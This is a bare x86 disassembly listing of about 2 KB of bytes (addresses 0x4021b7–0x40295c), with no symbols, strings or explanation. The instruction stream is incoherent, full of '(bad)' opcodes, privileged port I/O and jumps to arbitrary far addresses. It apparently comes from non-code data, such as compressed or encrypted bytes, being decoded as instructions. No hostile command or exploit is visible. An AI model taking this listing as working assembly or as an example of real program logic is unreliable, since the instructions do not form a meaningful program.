  4021b7:	std    
  4021b8:	push   0x31
  4021ba:	adc    dl,BYTE PTR [edi]
  4021bc:	call   0x28a6f640
  4021c1:	push   0xd37c38f
  4021c6:	and    al,0x59
  4021c8:	rcl    DWORD PTR [ecx-0x13],cl
  4021cb:	jbe    0x4021cd
  4021cd:	outs   dx,BYTE PTR ds:[esi]
  4021ce:	mov    ecx,DWORD PTR [ebx+0x53faca38]
  4021d4:	(bad)  
  4021d5:	jb     0x402181
  4021d7:	xchg   esi,eax
  4021d8:	and    BYTE PTR [ecx+esi*2+0x3f],bh
  4021dc:	or     DWORD PTR [ecx],ecx
  4021de:	xchg   DWORD PTR [edi-0x2510d9f2],eax
  4021e4:	and    dh,dl
  4021e6:	fistp  DWORD PTR [ebp+0x149d229]
  4021ec:	and    dl,BYTE PTR [esi+0xb]
  4021ef:	and    al,0x77
  4021f1:	push   edx
  4021f2:	shr    DWORD PTR ds:[ecx],cl
  4021f5:	pop    esi
  4021f6:	and    al,0x69
  4021f8:	inc    edi
  4021f9:	shr    BYTE PTR [edi+0xd],1
  4021fc:	popa   
  4021fd:	jae    0x40222c
  4021ff:	int3   
  402200:	xchg   ebp,eax
  402201:	ret    
  402202:	cmp    ebp,DWORD PTR [edi-0x28]
  402205:	jno    0x402260
  402207:	jle    0x402249
  402209:	jmp    0x7ee8e8b7
  40220e:	or     DWORD PTR [ebx],edx
  402210:	imul   edx,DWORD PTR [eax],0x14
  402213:	sbb    BYTE PTR [eax+0x3f],ch
  402216:	pop    ecx
  402217:	imul   edx,DWORD PTR [esi+0x1d],0x7
  40221b:	pop    esp
  40221c:	fs fs cmp eax,ebp
  402220:	mov    cl,0xa6
  402222:	out    0xd,al
  402224:	pushf  
  402225:	outs   dx,BYTE PTR ds:[esi]
  402226:	or     esp,ecx
  402228:	imul   ebp,DWORD PTR [esi],0xe4b93384
  40222e:	and    esi,DWORD PTR [edi]
  402230:	dec    ebx
  402231:	xor    BYTE PTR [eax+ebx*2+0x39],0x6c
  402236:	inc    ebx
  402237:	inc    ecx
  402238:	pop    eax
  402239:	adc    dh,0x3f
  40223c:	or     DWORD PTR [ecx+ecx*1-0x63],ebp
  402240:	loop   0x402286
  402242:	loope  0x40222d
  402244:	xor    ah,BYTE PTR [ebx+ebp*4+0xa]
  402248:	pop    ebx
  402249:	mov    ch,BYTE PTR [eax]
  40224b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40224c:	sub    BYTE PTR [ebp-0x3b3a86a2],dl
  402252:	scas   al,BYTE PTR es:[edi]
  402253:	pop    ds
  402254:	dec    esi
  402255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402256:	mov    DWORD PTR [ecx+0x78f70527],eax
  40225c:	mov    ch,0x8f
  40225e:	stos   DWORD PTR es:[edi],eax
  40225f:	mov    edx,ss
  402261:	mov    esp,0xbb586dce
  402266:	push   edi
  402267:	and    ebp,ebx
  402269:	jge    0x40225b
  40226b:	lahf   
  40226c:	mov    ebx,0x73eb8e32
  402271:	add    eax,0xec4f5302
  402276:	or     DWORD PTR [eax],eax
  402278:	jnp    0x40228f
  40227a:	sbb    eax,0x62008350
  40227f:	pop    ebp
  402280:	ins    DWORD PTR es:[edi],dx
  402281:	push   0xcd119366
  402286:	push   0xffffffac
  402288:	push   ebx
  402289:	ds aas 
  40228b:	or     al,0x58
  40228d:	lods   eax,DWORD PTR ds:[esi]
  40228e:	addr16 sbb al,0xfb
  402291:	xchg   BYTE PTR [edx],cl
  402293:	inc    edx
  402294:	fmul   QWORD PTR [esi+0x17cdb297]
  40229a:	cmp    ecx,edi
  40229c:	icebp  
  40229d:	loop   0x4022d7
  40229f:	cmc    
  4022a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022a1:	fisttp WORD PTR [ebp+0x27b14147]
  4022a7:	and    BYTE PTR [ecx],dl
  4022a9:	xchg   BYTE PTR [esi+0xf],dl
  4022ac:	stos   BYTE PTR es:[edi],al
  4022ad:	pop    ecx
  4022ae:	jge    0x4022c5
  4022b0:	fnstsw WORD PTR [ebx-0x4d]
  4022b3:	in     al,dx
  4022b4:	stc    
  4022b5:	ja     0x40225c
  4022b7:	mov    eax,0xaaf9b1dc
  4022bc:	mov    dl,0x4b
  4022be:	frstor [eax-0x36006c1a]
  4022c4:	mov    dl,BYTE PTR [ecx]
  4022c6:	dec    eax
  4022c7:	aam    0x78
  4022c9:	bound  ebx,QWORD PTR [ebp+esi*1+0x443ad3ea]
  4022d0:	cmp    eax,0x2b1fd20a
  4022d5:	mov    ch,BYTE PTR [ecx+eax*8]
  4022d8:	xlat   BYTE PTR ds:[ebx]
  4022d9:	xchg   edi,eax
  4022da:	adc    al,0x89
  4022dc:	mov    WORD PTR [ecx],?
  4022de:	pop    esi
  4022df:	es dec edx
  4022e1:	sub    DWORD PTR [esi+eiz*4-0x1857002d],eax
  4022e8:	stos   DWORD PTR es:[edi],eax
  4022e9:	(bad)  
  4022ea:	cmp    BYTE PTR [eax+0x60],cl
  4022ed:	rcr    BYTE PTR [edx],cl
  4022ef:	aas    
  4022f0:	cmp    bl,bl
  4022f2:	aas    
  4022f3:	or     eax,0x5b88013d
  4022f8:	ficomp DWORD PTR [ebp+0x6ffb4f94]
  4022fe:	push   eax
  4022ff:	cmp    edx,edi
  402301:	adc    al,0xfe
  402303:	xchg   esi,eax
  402304:	mov    esi,DWORD PTR [eax]
  402306:	std    
  402307:	mov    BYTE PTR [eax+0x4b699774],al
  40230d:	icebp  
  40230e:	lahf   
  40230f:	adc    ebp,DWORD PTR [ebx-0x4c]
  402312:	jecxz  0x402367
  402314:	rcl    DWORD PTR [ebx],cl
  402316:	pop    edi
  402317:	repz sub BYTE PTR [esi],dh
  40231a:	dec    ebx
  40231b:	xchg   ecx,eax
  40231c:	pop    ecx
  40231d:	sub    bl,BYTE PTR [ecx]
  40231f:	ss mov esi,0xe7965e4
  402325:	sub    DWORD PTR [ecx],0xc5a8ed2d
  40232b:	xor    bl,ch
  40232d:	pushf  
  40232e:	pop    edx
  40232f:	jle    0x402327
  402331:	outs   dx,BYTE PTR ds:[esi]
  402332:	gs jmp 0x8e2a:0x1a461b80
  40233a:	mov    eax,0xa8d35841
  402340:	sbb    esi,DWORD PTR [ebp+edi*2-0x7bef4b42]
  402347:	test   BYTE PTR [ebx+edi*2],0xb5
  40234b:	jne    0x402333
  40234d:	xor    BYTE PTR ds:0x11d9817a,0xed
  402354:	push   ebx
  402355:	scas   al,BYTE PTR es:[edi]
  402356:	add    bh,BYTE PTR [edi]
  402358:	inc    ecx
  402359:	mov    bh,0xfb
  40235b:	push   cs
  40235c:	nop
  40235d:	fst    QWORD PTR [eax-0x23468207]
  402363:	or     cl,BYTE PTR [ebp+ebx*2-0x21]
  402367:	mov    BYTE PTR [esi+0x3dcd7548],bl
  40236d:	inc    eax
  40236e:	cmp    al,0x54
  402370:	sub    al,BYTE PTR [ebx+0x62cd7b49]
  402376:	aad    0x53
  402378:	int3   
  402379:	loope  0x4023e4
  40237b:	adc    BYTE PTR [edi],0xea
  40237e:	mov    cl,0xbd
  402380:	dec    edi
  402381:	jbe    0x4023e1
  402383:	ficomp DWORD PTR [esi]
  402385:	push   cs
  402386:	jns    0x402343
  402388:	ror    ch,1
  40238a:	(bad)  
  40238b:	fcom   QWORD PTR [ecx]
  40238d:	push   0xffffff97
  40238f:	inc    eax
  402390:	sub    al,0x76
  402392:	mov    al,0xcb
  402394:	mov    ah,0x87
  402396:	lock stc 
  402398:	sub    DWORD PTR [edi+edi*8-0x4b85d973],eax
  40239f:	jmp    0x402360
  4023a1:	outs   dx,DWORD PTR ds:[esi]
  4023a2:	ins    DWORD PTR es:[edi],dx
  4023a3:	popa   
  4023a4:	arpl   di,sp
  4023a6:	xor    BYTE PTR [esi-0x74],0xd8
  4023aa:	stos   DWORD PTR es:[edi],eax
  4023ab:	ja     0x40235d
  4023ad:	call   0x6102:0xe93fa79c
  4023b4:	jle    0x402392
  4023b6:	ret    0xfc87
  4023b9:	mov    bh,0xc
  4023bb:	cwde   
  4023bc:	pop    edx
  4023bd:	cli    
  4023be:	enter  0x62ef,0x9e
  4023c2:	je     0x4023f7
  4023c4:	pop    esp
  4023c5:	or     DWORD PTR [esi-0x73],ebp
  4023c8:	imul   DWORD PTR [eax-0x76]
  4023cb:	inc    ebp
  4023cc:	rcl    cl,1
  4023ce:	jmp    0x40241e
  4023d0:	mov    eax,ds:0x11208063
  4023d5:	imul   eax,DWORD PTR [edi],0xffffffb1
  4023d8:	pop    esi
  4023d9:	or     eax,0x7641a539
  4023de:	mov    ebx,0x8184f2c3
  4023e3:	xor    al,0x51
  4023e5:	push   cs
  4023e6:	pop    ebx
  4023e7:	fdivrp st(7),st
  4023e9:	mov    al,ds:0x3382af42
  4023ee:	mov    ds:0xef209c7f,al
  4023f3:	fld    QWORD PTR [edi+0x3b79290d]
  4023f9:	sub    BYTE PTR [edx+0x4991679b],ch
  4023ff:	loop   0x402411
  402401:	daa    
  402402:	lds    ebp,FWORD PTR [edx]
  402404:	xor    ecx,DWORD PTR [ebp-0x5d24e3c3]
  40240a:	int3   
  40240b:	inc    edx
  40240c:	mov    DWORD PTR [esi+0x2f461610],esi
  402412:	ss xor eax,edi
  402415:	cmp    ah,bl
  402417:	lahf   
  402418:	xchg   BYTE PTR [ebx],dl
  40241a:	xchg   esp,eax
  40241b:	xchg   ebp,eax
  40241c:	(bad)
  40241f:	(bad)  
  402420:	xchg   edi,eax
  402421:	in     al,0xcb
  402423:	(bad)  
  402424:	scas   eax,DWORD PTR es:[edi]
  402425:	fnstcw WORD PTR [ecx+0x49c28a29]
  40242b:	jno    0x4023d5
  40242d:	loop   0x4024a8
  40242f:	iret   
  402430:	clc    
  402431:	paddw  mm1,mm7
  402434:	stos   DWORD PTR es:[edi],eax
  402435:	sub    esi,DWORD PTR [edx]
  402437:	sahf   
  402438:	xchg   ebp,eax
  40243a:	push   0x53
  40243c:	mov    ebp,0x4c49031
  402441:	adc    al,BYTE PTR ds:0x346f637a
  402447:	retf   0xcf1c
  40244a:	sub    eax,0xae6ff5d6
  40244f:	sub    esi,ebp
  402451:	pop    ebx
  402452:	cmp    BYTE PTR [ebp-0x52],dh
  402455:	push   esp
  402456:	shl    DWORD PTR [edx+0x3fc3cbd3],0xc2
  40245d:	test   DWORD PTR [eax+edi*1],edi
  402460:	das    
  402461:	mov    ds:0xffe54832,eax
  402466:	call   0x94e8f94
  40246b:	sub    DWORD PTR [ebx+0x11],ecx
  40246e:	add    al,0xb2
  402470:	(bad)  
  402472:	mov    ebp,DWORD PTR [esi+0x6]
  402475:	jle    0x402498
  402477:	inc    ecx
  402478:	mov    ds:0x608ddbb7,eax
  40247d:	xchg   ebp,eax
  40247e:	xor    bh,BYTE PTR [eax]
  402480:	loopne 0x40248f
  402482:	dec    eax
  402483:	or     eax,0x89faa8ef
  402488:	sub    eax,0x177bec48
  40248d:	loope  0x4024de
  40248f:	mov    dh,0x93
  402491:	ret    0xb32b
  402494:	cmp    eax,0x45f74de
  402499:	aam    0x66
  40249b:	mov    cl,0x34
  40249d:	push   ebp
  40249e:	addr16 test al,0x1c
  4024a1:	cmp    DWORD PTR [edi+0x1e],esp
  4024a4:	mov    eax,0x9f47e4fd
  4024a9:	or     DWORD PTR [eax],edx
  4024ab:	std    
  4024ac:	jns    0x402485
  4024ae:	ror    BYTE PTR [edi],cl
  4024b0:	adc    edx,ebx
  4024b2:	fld    DWORD PTR [edx-0x9d28576]
  4024b8:	dec    edx
  4024b9:	pusha  
  4024ba:	in     al,dx
  4024bb:	jne    0x40253a
  4024bd:	mov    ah,0xd2
  4024bf:	imul   DWORD PTR [esi+0x121987da]
  4024c5:	adc    ah,al
  4024c7:	and    eax,0x71a6f04c
  4024cc:	fwait
  4024cd:	sub    BYTE PTR [eax-0x62deee59],ch
  4024d3:	or     dl,BYTE PTR [esi+ecx*8-0x6a]
  4024d7:	or     eax,0x6332d305
  4024dc:	push   ebx
  4024dd:	push   eax
  4024de:	out    0x90,al
  4024e0:	repz push es
  4024e2:	sub    eax,0x9c127d77
  4024e7:	outs   dx,DWORD PTR ds:[esi]
  4024e8:	or     al,dh
  4024ea:	scas   al,BYTE PTR es:[edi]
  4024eb:	out    dx,eax
  4024ec:	pop    ebp
  4024ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024ee:	push   ds
  4024ef:	fdiv   QWORD PTR ds:0xebd2b2d2
  4024f5:	jp     0x40253f
  4024f7:	cmp    ecx,ebp
  4024f9:	cmp    eax,0xd83f9556
  4024fe:	jno    0x402505
  402500:	and    ah,BYTE PTR [edi+0x23b919aa]
  402506:	fstp   TBYTE PTR [eax]
  402508:	xlat   BYTE PTR ds:[ebx]
  402509:	mov    al,ds:0x50e7a2d1
  40250e:	(bad)  
  402510:	mov    DWORD PTR [esi-0x7b70140e],edi
  402516:	(bad)  
  402517:	(bad)  
  402518:	es dec ebp
  40251a:	cmp    al,0x18
  40251c:	inc    ebp
  40251d:	mov    BYTE PTR [eax],dh
  40251f:	jmp    DWORD PTR [edi]
  402521:	fmul   st,st(4)
  402523:	push   ecx
  402524:	xor    ebp,DWORD PTR [ecx+0x1d]
  402527:	push   ecx
  402528:	stos   DWORD PTR es:[edi],eax
  402529:	push   ds
  40252a:	sbb    cl,BYTE PTR [ebx-0x510bf564]
  402530:	pop    esp
  402531:	pushf  
  402532:	outs   dx,BYTE PTR ds:[esi]
  402533:	jb     0x402572
  402535:	repnz aam 0xb1
  402538:	sub    esp,DWORD PTR [eax-0x8]
  40253b:	out    0x5d,al
  40253d:	mov    esp,0xf0e45e74
  402542:	pop    es
  402543:	out    dx,eax
  402544:	fsub   st,st(4)
  402546:	jbe    0x402520
  402548:	jl     0x40258c
  40254a:	pop    ebx
  40254b:	pop    esp
  40254c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40254e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40254f:	outs   dx,DWORD PTR ds:[esi]
  402550:	pushf  
  402551:	sub    DWORD PTR [eax+0x3feffc5f],edi
  402557:	xor    DWORD PTR [ebp+0x535b3dd0],ebx
  40255d:	ins    DWORD PTR es:[edi],dx
  40255e:	sub    DWORD PTR [edi],ecx
  402560:	mov    ebx,0xf0cc9de9
  402565:	mov    ds:0x79456c10,eax
  40256a:	std    
  40256b:	popf   
  40256c:	ss (bad) 
  40256e:	jbe    0x40252e
  402570:	aas    
  402571:	jb     0x402506
  402573:	push   ss
  402574:	sahf   
  402575:	ret    0x5a26
  402578:	jne    0x40252e
  40257a:	js     0x40253c
  40257c:	inc    edx
  40257d:	test   esp,0xca674184
  402583:	dec    esi
  402584:	push   es
  402585:	repz inc eax
  402587:	jmp    0x4025c9
  402589:	mov    dl,0x65
  40258b:	mov    cl,0xd5
  40258d:	cmc    
  40258e:	dec    ebp
  40258f:	lahf   
  402590:	cli    
  402591:	(bad)  
  402592:	fwait
  402593:	sbb    ebp,DWORD PTR [eax-0x2e717afd]
  402599:	inc    ecx
  40259a:	popf   
  40259b:	sbb    ebp,DWORD PTR [edx+edx*8-0xc]
  40259f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025a0:	pop    ebx
  4025a1:	dec    ebx
  4025a2:	clc    
  4025a3:	leave  
  4025a4:	loopne 0x4025f0
  4025a6:	mov    cl,0x94
  4025a8:	nop
  4025a9:	ficomp DWORD PTR [edi-0x3b]
  4025ac:	ins    BYTE PTR es:[edi],dx
  4025ad:	outs   dx,BYTE PTR ds:[esi]
  4025ae:	adc    ah,BYTE PTR [eax]
  4025b0:	cdq    
  4025b1:	mov    ah,0x4e
  4025b3:	sahf   
  4025b4:	pop    ebp
  4025b5:	imul   eax,DWORD PTR [esi],0x55acf54f
  4025bb:	dec    esp
  4025bc:	hlt    
  4025bd:	cmp    BYTE PTR [edx+eiz*1+0x57],dl
  4025c1:	mov    eax,0xc2d06d07
  4025c6:	fcmovnu st,st(0)
  4025c8:	lds    edx,FWORD PTR [edi+0x40fc8625]
  4025ce:	mov    ebp,0xb294a7c6
  4025d3:	dec    esi
  4025d4:	fistp  QWORD PTR [edx-0xc]
  4025d7:	sar    DWORD PTR [esi-0x37],0xad
  4025db:	pop    esi
  4025dc:	outs   dx,DWORD PTR ds:[esi]
  4025dd:	out    0x1f,eax
  4025df:	outs   dx,BYTE PTR ds:[esi]
  4025e0:	inc    edx
  4025e1:	sbb    eax,0xfc96cb02
  4025e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025e7:	cmp    eax,0x8901a9e9
  4025ec:	in     eax,dx
  4025ed:	stos   DWORD PTR es:[edi],eax
  4025ee:	xchg   esi,eax
  4025ef:	cmp    DWORD PTR es:[ecx],ebp
  4025f2:	(bad)  
  4025f3:	jmp    0x402666
  4025f5:	mov    bl,BYTE PTR ds:0xa3861e4a
  4025fb:	scas   eax,DWORD PTR es:[edi]
  4025fc:	mov    dh,0x84
  4025fe:	shr    DWORD PTR [ebp+0x67],cl
  402601:	ret    
  402602:	sub    ah,BYTE PTR [edx]
  402604:	ds ins DWORD PTR es:[edi],dx
  402606:	retf   
  402607:	test   ebp,0x708464b5
  40260d:	(bad)  
  40260e:	xchg   ecx,eax
  40260f:	pop    eax
  402610:	icebp  
  402611:	xchg   esi,eax
  402612:	push   esp
  402613:	xchg   edi,eax
  402614:	shl    DWORD PTR [eax+0x77],1
  402617:	pop    ss
  402618:	mov    al,0xf9
  40261a:	test   DWORD PTR [edx-0x39fe8c4c],0x738cc618
  402624:	mov    ?,WORD PTR [esi+eax*8-0x18]
  402628:	fucomip st,st(4)
  40262a:	bound  esp,QWORD PTR [esi-0x5c]
  40262d:	sahf   
  40262e:	mov    dh,0xa6
  402630:	aas    
  402631:	call   0xe138a92b
  402636:	mov    esp,0x2647732c
  40263b:	mov    ecx,0x8e68f55e
  402640:	push   ebp
  402641:	cmp    bh,BYTE PTR [esi]
  402643:	int    0xf9
  402645:	sub    edi,0x73fafc10
  40264b:	xchg   ebx,eax
  40264c:	add    ah,BYTE PTR [esi-0x19c523b3]
  402652:	retf   0xb25c
  402655:	pop    edi
  402656:	sub    al,0xb9
  402658:	lock inc eax
  40265a:	dec    eax
  40265b:	inc    eax
  40265c:	mov    ah,0xd9
  40265e:	xchg   edi,eax
  40265f:	rol    eax,cl
  402661:	mov    esp,0xf0ce9c3a
  402666:	xchg   edi,eax
  402667:	adc    edi,DWORD PTR [esi+eiz*8+0x32665627]
  40266e:	jmp    0xd310:0x697ec2ac
  402675:	and    eax,0xe4777fb5
  40267a:	inc    ecx
  40267b:	and    al,0x35
  40267d:	int3   
  40267e:	mov    WORD PTR [edx+0x6a],ss
  402681:	test   BYTE PTR [esi-0x31],ch
  402684:	jbe    0x4026b9
  402686:	dec    ecx
  402687:	push   ebx
  402688:	sub    ch,BYTE PTR [edi-0x29]
  40268b:	lahf   
  40268c:	enter  0x615c,0x5
  402690:	or     BYTE PTR [ebx-0x10edf072],ah
  402696:	stos   BYTE PTR es:[edi],al
  402697:	repnz fnstenv [edx+0x440b6de]
  40269e:	test   DWORD PTR [ebx+0x43c1d6c5],ecx
  4026a4:	aam    0x5c
  4026a6:	add    al,0xf6
  4026a8:	ss popf 
  4026aa:	std    
  4026ab:	mov    bh,0x16
  4026ad:	sub    eax,0x63a18d02
  4026b3:	outs   dx,DWORD PTR ds:[esi]
  4026b4:	dec    ebp
  4026b5:	mov    dh,0xb6
  4026b7:	pop    ebp
  4026b8:	xchg   ecx,eax
  4026b9:	dec    ebp
  4026ba:	ret    0xeb03
  4026bd:	mov    eax,0xde635477
  4026c2:	(bad)  
  4026c3:	and    BYTE PTR [eax+0x4b0476ae],bl
  4026c9:	fist   WORD PTR [ecx-0x2732ebe7]
  4026cf:	push   ebx
  4026d0:	add    al,0x99
  4026d2:	cli    
  4026d3:	fmul   DWORD PTR [eax]
  4026d5:	mov    eax,ds:0xf1bdeae0
  4026da:	dec    esi
  4026db:	sbb    eax,0x279682ca
  4026e0:	popf   
  4026e1:	out    0x51,al
  4026e3:	adc    dh,BYTE PTR [esi]
  4026e5:	scas   al,BYTE PTR es:[edi]
  4026e6:	add    ebx,DWORD PTR [eax+ecx*8+0x37]
  4026ea:	loop   0x4026dd
  4026ec:	paddusb mm7,QWORD PTR [eax-0x8]
  4026f0:	cld    
  4026f1:	mov    al,0xda
  4026f3:	jno    0x4026c8
  4026f5:	fwait
  4026f6:	sbb    edx,ecx
  4026f8:	push   0xffffff94
  4026fa:	pop    edi
  4026fb:	shl    BYTE PTR [eax],1
  4026fd:	jl     0x40268b
  4026ff:	aaa    
  402700:	rcl    DWORD PTR [eax],cl
  402702:	aaa    
  402703:	inc    eax
  402704:	out    0x6,eax
  402706:	or     eax,0xf500a0cd
  40270b:	sub    eax,0xc979e50b
  402710:	les    edi,FWORD PTR ds:0xe1a317a
  402716:	fwait
  402717:	xchg   DWORD PTR [edx+0x5e],esi
  40271a:	cmp    DWORD PTR [edi*1+0x8634c7d],ebx
  402721:	adc    DWORD PTR [ebp-0x3a],ebp
  402724:	adc    ah,bl
  402726:	out    0x58,eax
  402728:	push   ds
  402729:	aad    0x20
  40272b:	dec    esi
  40272c:	ja     0x4026c4
  40272e:	fcom   QWORD PTR [ecx+0xe2f38b]
  402734:	rol    ebx,0xf6
  402737:	mov    eax,0xccb381b0
  40273c:	push   esp
  40273d:	retf   
  40273e:	sub    eax,DWORD PTR [edi-0x1f]
  402741:	test   al,0x38
  402743:	stc    
  402744:	sub    eax,0xa35cb78d
  402749:	mov    DWORD PTR [ecx+edx*8],ecx
  40274c:	ficom  WORD PTR [eax+ebp*1]
  40274f:	fcmovbe st,st(1)
  402751:	jmp    DWORD PTR [ebp-0x7e]
  402754:	sbb    ecx,DWORD PTR [ebp-0x7f]
  402757:	mov    al,ds:0x7f64dcc3
  40275c:	jmp    FWORD PTR [ebp+0x79eac1b5]
  402762:	mov    al,0x10
  402764:	mov    cl,0x48
  402766:	repz cmc 
  402768:	aaa    
  402769:	mov    dl,0x74
  40276b:	hlt    
  40276c:	jb     0x4027e4
  40276e:	in     eax,dx
  40276f:	clc    
  402770:	jmp    0x402769
  402772:	sub    al,0xe
  402774:	imul   ah
  402776:	test   eax,0x4cc17dd4
  40277b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40277c:	jmp    eax
  40277e:	xor    DWORD PTR [ecx+0x6d],eax
  402781:	xchg   ebx,eax
  402782:	(bad)  
  402783:	sub    bh,BYTE PTR [ebx]
  402785:	jae    0x402744
  402787:	or     ch,BYTE PTR [esi+0x564e4550]
  40278d:	imul   edx,DWORD PTR [ebp+0x3d1a187b],0x51
  402794:	add    dh,BYTE PTR [ebx]
  402796:	mov    cs,WORD PTR [ecx]
  402798:	ss jb  0x4027e4
  40279b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40279c:	adc    edx,DWORD PTR [ebp-0x2c]
  40279f:	cdq    
  4027a0:	sub    al,0xcc
  4027a2:	test   DWORD PTR [ebx],edi
  4027a4:	retf   0xf15
  4027a7:	dec    eax
  4027a8:	and    esp,0x9c9e91fa
  4027ae:	xchg   ecx,eax
  4027af:	mov    dl,0x5
  4027b1:	cmp    al,0xcd
  4027b3:	adc    ebx,DWORD PTR [eax]
  4027b5:	or     BYTE PTR [edi+0x52b2799c],al
  4027bb:	mov    ecx,DWORD PTR cs:[edi]
  4027be:	inc    ebp
  4027bf:	jecxz  0x4027f0
  4027c1:	jbe    0x4027fd
  4027c3:	and    DWORD PTR [edx+0x43528896],esp
  4027c9:	fnstenv [edx+0x49]
  4027cc:	cmp    DWORD PTR [eax+0x1c],eax
  4027cf:	mov    dh,0x35
  4027d1:	fild   WORD PTR [ebx-0x22c1ecb3]
  4027d7:	inc    esi
  4027d8:	pop    ss
  4027d9:	dec    edi
  4027da:	sbb    al,0xf8
  4027dc:	shl    ecx,1
  4027de:	xchg   DWORD PTR [esi+0x0],ecx
  4027e1:	mov    ds:0x83cf1c96,al
  4027e6:	clc    
  4027e7:	xchg   ebx,eax
  4027e8:	add    dl,bh
  4027ea:	aam    0x74
  4027ec:	or     DWORD PTR [edx+eiz*4+0x40c7d772],esp
  4027f3:	pop    ebx
  4027f4:	xlat   BYTE PTR ds:[ebx]
  4027f5:	push   eax
  4027f6:	xor    DWORD PTR [eax],ebx
  4027f8:	leave  
  4027f9:	loopne 0x4027ce
  4027fb:	cli    
  4027fc:	ret    
  4027fd:	mov    ebx,0xe857aed9
  402802:	sbb    eax,0xee6a3a90
  402807:	into   
  402808:	es mov eax,0xa690b1c2
  40280e:	repz xor bl,BYTE PTR [ebx]
  402811:	pop    esp
  402812:	pop    ebp
  402813:	fs scas al,BYTE PTR es:[edi]
  402815:	ds push 0x6d
  402818:	jle    0x4027b3
  40281a:	mov    edx,0x834c72b0
  40281f:	in     eax,dx
  402820:	ss mov esp,0xcdcedae
  402826:	es dec ebx
  402828:	sub    eax,0x6a575355
  40282d:	mov    ds:0x59edf4b7,eax
  402832:	retf   0xb422
  402835:	cwde   
  402836:	jo     0x4028a7
  402838:	cmp    eax,0xfef0a38c
  40283d:	std    
  40283e:	ja     0x4027d8
  402840:	cli    
  402841:	mov    edx,0xcf674367
  402846:	adc    esi,DWORD PTR [ebp+0x22efd5a3]
  40284c:	jnp    0x4028c1
  40284e:	sub    dl,BYTE PTR [ebx-0x3c]
  402851:	fdivr  DWORD PTR [esi-0x244018c9]
  402857:	add    al,0x60
  402859:	add    DWORD PTR [esi-0x63],esp
  40285c:	in     eax,0x44
  40285e:	popf   
  40285f:	jno    0x4027e8
  402861:	sub    ebp,DWORD PTR [ecx]
  402863:	or     ebp,DWORD PTR ds:0xf6fb0d9d
  402869:	jecxz  0x402808
  40286b:	sahf   
  40286c:	dec    edx
  40286d:	pop    ebp
  40286e:	call   0x710b9969
  402873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402874:	mov    esi,DWORD PTR [edx+eiz*1]
  402877:	(bad)  
  402878:	ffree  st(0)
  40287a:	mov    WORD PTR ss:[eax],es
  40287d:	inc    ebp
  40287e:	in     eax,dx
  40287f:	pop    edi
  402880:	popa   
  402881:	rol    BYTE PTR [ebx+0xc],cl
  402884:	cdq    
  402885:	xchg   DWORD PTR [esp+ebx*2],edi
  402888:	mov    al,0xcb
  40288a:	dec    ebx
  40288b:	test   esi,esp
  40288d:	mov    BYTE PTR [ebp+0x29],bl
  402890:	xchg   ecx,eax
  402891:	rcl    cl,cl
  402893:	(bad)  
  402894:	jo     0x4028e8
  402896:	mov    DWORD PTR [esi+ebp*4],edi
  402899:	into   
  40289a:	jge    0x40281f
  40289c:	add    BYTE PTR [edx+ebx*4+0x68199868],bl
  4028a3:	addr16 mov cl,0x8e
  4028a6:	(bad)  
  4028a7:	fild   QWORD PTR [ebx]
  4028a9:	iret   
  4028aa:	mov    esi,0xe40ef308
  4028af:	and    al,0x8d
  4028b1:	rcr    DWORD PTR [ebx-0x6a30bbc9],cl
  4028b7:	jns    0x40289f
  4028b9:	fidivr WORD PTR [ebx]
  4028bb:	loop   0x402922
  4028bd:	push   ecx
  4028be:	push   edx
  4028bf:	mov    ecx,0x2c9fb5af
  4028c4:	cdq    
  4028c5:	mov    bh,0x6b
  4028c7:	lods   eax,DWORD PTR ds:[esi]
  4028c8:	sbb    DWORD PTR [eax+0x14f8b1de],eax
  4028ce:	scas   eax,DWORD PTR es:[edi]
  4028cf:	stos   BYTE PTR es:[edi],al
  4028d0:	stos   DWORD PTR es:[edi],eax
  4028d1:	jge    0x40293a
  4028d3:	mov    edx,0x1239657d
  4028d8:	dec    esi
  4028d9:	xor    dl,BYTE PTR [ebx]
  4028db:	es pop eax
  4028dd:	mov    bl,0x21
  4028df:	lods   eax,DWORD PTR ds:[esi]
  4028e0:	scas   al,BYTE PTR es:[edi]
  4028e1:	je     0x402884
  4028e3:	sub    al,ch
  4028e5:	adc    ch,ch
  4028e7:	retf   0x905
  4028ea:	jle    0x402933
  4028ec:	jno    0x4028fe
  4028ee:	aad    0x31
  4028f0:	mov    al,ds:0x6a0f487
  4028f5:	mov    eax,0x22f66d0f
  4028fa:	cld    
  4028fb:	xchg   ecx,eax
  4028fc:	add    ah,cl
  4028fe:	sahf   
  4028ff:	in     al,dx
  402900:	adc    esi,DWORD PTR [edi]
  402902:	gs in  al,dx
  402904:	clc    
  402905:	in     eax,0x80
  402907:	cmp    ebp,DWORD PTR [ecx-0x5f]
  40290a:	fistp  WORD PTR [edx]
  40290c:	sbb    BYTE PTR [eax+0x31b653aa],0x36
  402913:	arpl   WORD PTR [edi+0x7d],cx
  402916:	call   0x809929f0
  40291b:	arpl   dx,ax
  40291d:	inc    esi
  40291e:	icebp  
  40291f:	sub    DWORD PTR [ebx+0x15670b26],edx
  402925:	loope  0x402967
  402927:	or     al,0xd3
  402929:	jmp    0x40294d
  40292b:	mov    al,ds:0x1b2c2a69
  402930:	iret   
  402931:	pop    ds
  402932:	ret    
  402933:	jbe    0x402929
  402935:	retf   
  402936:	xlat   BYTE PTR ds:[ebx]
  402937:	inc    ebp
  402938:	ds pop ds
  40293a:	les    eax,FWORD PTR [edx+ecx*1]
  40293d:	repz sahf 
  40293f:	loopne 0x402954
  402941:	xchg   edx,eax
  402942:	add    al,0x3e
  402944:	je     0x4029b7
  402946:	mov    bh,0x1e
  402948:	or     edi,DWORD PTR [ebx+0x621754a2]
  40294e:	ret    0x11ca
  402951:	ds leave 
  402953:	xchg   edx,eax
  402954:	clc    
  402955:	sub    BYTE PTR [edi+ebx*8-0x3e6f3fbe],cl
  40295c:	lock data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
